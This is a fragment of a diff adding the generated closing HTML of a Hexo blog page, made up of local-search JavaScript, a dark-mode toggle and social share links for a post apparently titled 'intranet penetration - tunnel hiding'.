+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F + '&url=' + https%3A%2F%2Fghostasky.github.io%2F2022%2F02%2F10%2F%25E5%2586%2585%25E7%25BD%2591%25E6%25B8%2597%25E9%2580%258F-%25E9%259A%25A7%25E9%2581%2593%25E9%259A%2590%25E8%2597%258F%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://ghostasky.github.io/2022/02/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
